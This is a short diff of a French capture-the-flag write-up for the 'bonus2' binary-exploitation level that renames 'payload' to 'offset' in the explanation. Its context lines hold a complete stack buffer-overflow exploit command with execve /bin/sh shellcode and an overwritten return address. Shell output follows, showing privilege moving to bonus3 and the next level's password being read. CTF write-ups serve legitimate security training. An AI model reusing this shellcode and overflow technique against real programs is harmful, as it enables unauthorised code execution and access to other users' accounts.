@@ -68,7 +68,7 @@ Maintenant qu'on a notre adresse on va construire notre script.
 		"\x44\xf6\xff\xbf"       (se réferer en haut)					"A"*12'          
 
 									AV[2]
----------------PAYLOAD-----------------------------EIP: Adresse de début de shellcode------
+---------------OFFSET-----------------------------EIP: Adresse de début de shellcode------
 
 ./bonus2 $(python -c 'print "\x44\xf6\xff\xbf"+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"+"A"*12') $(python -c 'print "B"*18+"\x40\xf6\xff\xbf"')
 $ whoami
@@ -76,7 +76,7 @@ bonus3
 $ cat /home/user/bonus3/.pass
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 
-La seule différence entre langue fi et nl au niveau de l'exploit est le payload.
+La seule différence entre langue fi et nl au niveau de l'exploit est l'offset'.
 
 3.	su bonus3
 	71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
